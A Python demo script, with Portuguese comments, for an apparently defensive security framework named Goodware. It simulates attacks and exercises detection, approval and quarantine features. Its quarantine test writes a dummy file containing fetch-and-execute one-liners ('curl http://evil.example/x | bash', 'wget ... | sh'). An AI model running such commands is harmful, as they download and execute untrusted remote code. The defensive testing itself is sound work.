"""
Goodware v3.0 - Exemplo: simular ataques e observar respostas.

Uso:
  PYTHONPATH=. python3 examples/simulated_attack.py
"""
import time

from goodware.core.engine import Engine
from goodware.core.config import GoodwareConfig
from goodware.sensors import SensorManager
from goodware.crypto import CryptoManager
from goodware.prediction import PredictionManager
from goodware.federated import FederatedManager
from goodware.human_factor import HumanFactorManager
from goodware.physical import PhysicalSecurityManager
from goodware.supply_chain import SupplyChainManager
from goodware.immune import ImmuneManager
from goodware.decision import DecisionManager
from goodware.effector import EffectorManager


def banner(msg):
    print()
    print("=" * 70)
    print(f"  {msg}")
    print("=" * 70)


def main():
    print("🛡️  Goodware v3.0 — Simulated Attack Demo\n")
    cfg = GoodwareConfig.load()
    engine = Engine(cfg)
    sm = SensorManager(engine, cfg)
    cm = CryptoManager(engine, cfg); engine.register("crypto", cm)
    pm = PredictionManager(engine, cfg)
    fm = FederatedManager(engine, cfg)
    hf = HumanFactorManager(engine, cfg); engine.register("human_factor", hf)
    pm2 = PhysicalSecurityManager(engine, cfg); engine.register("physical", pm2)
    sc = SupplyChainManager(engine, cfg); engine.register("supply_chain", sc)
    im = ImmuneManager(engine, cfg)
    dm = DecisionManager(engine, cfg)
    em = EffectorManager(engine, cfg)

    # arrancar
    cm.start()
    sm.start_all()
    pm.start_all()
    fm.start_all()
    hf.start(); pm2.start(); sc.start(); im.start_all(); dm.start(); em.start()  # noop for symmetry

    banner("1. ATESTAÇÃO DE HARDWARE")
    print(pm2.attest_now())

    banner("2. ESTADO INICIAL DO CRYPTO")
    print(cm.status())

    banner("3. INJETAR 3 ATAQUES SINTÉTICOS")
    sim = pm.simulator
    print(sim.simulate(3))
    time.sleep(1)

    banner("4. AVALIAÇÃO DE COBERTURA")
    print(sim.evaluate_defense())

    banner("5. PREDIÇÃO ATUAL")
    print(pm.threat.predict())
    print(pm.anomaly.forecast(1.0))

    banner("6. ZERO-DAY PREDICTIONS")
    print(im.zero_day.predict_now()[:3])

    banner("7. DECISÃO SOBRE EVENTO HIGH")
    print(dm.decide({"severity": "high", "type": "sensor.process_anomaly", "payload": {"anomaly_score": 0.95}}))

    banner("8. HUMAN FACTOR — DELETE_USER EM LOCAL/HORA SUSPEITOS")
    result = hf.evaluate({"action": "delete_user", "user": "admin", "location": "unknown", "time_of_day": 3, "device_id": "unknown"})
    print(result)
    if result.get("request_id"):
        print("  A aprovar como admin1:", hf.approve(result["request_id"], "admin1"))
        print("  A aprovar como admin2:", hf.approve(result["request_id"], "admin2"))

    banner("9. EFETOR — BLOQUEAR SMB, FAZER SNAPSHOT")
    print(em.execute_action({"type": "block_port", "target": "445", "reason": "ransomware_precursor"}))
    print(em.execute_action({"type": "snapshot", "paths": ["/etc/passwd"], "reason": "pre-demo"}))
    print("Firewall snapshot:", em.firewall.snapshot())

    banner("10. SBOM VERIFICATION")
    print(sc.verify_all()["sbom"])

    banner("11. QUARANTINE TEST")
    test = "/tmp/gw_demo_malware.sh"
    with open(test, "w") as f:
        f.write("#!/bin/bash\ncurl http://evil.example/x | bash\nwget http://x.com/y -O- | sh\n")
    res = em.execute_action({"type": "quarantine", "target": test, "reason": "test_malware"})
    print(res)
    print("Quarantined list:", em.list_quarantined() if hasattr(em, "list_quarantined") else sc.engine.state.list_quarantined())

    banner("12. PUSH FEDERADO")
    print(fm.push_now())
    print("Server model version:", fm.server.current_model().get("version"))

    banner("13. RELATÓRIO FINAL")
    print({
        "engine": engine.status(),
        "sensors": sm.status(),
        "crypto": cm.status(),
        "human_factor": hf.status(),
        "immune": im.status(),
    })

    # shutdown
    sm.stop_all(); fm.stop_all(); im.stop_all(); dm.stop(); em.stop()  # noop for symmetry
    print("\n✓ Demo completa. Goodware parado.")


if __name__ == "__main__":
    main()
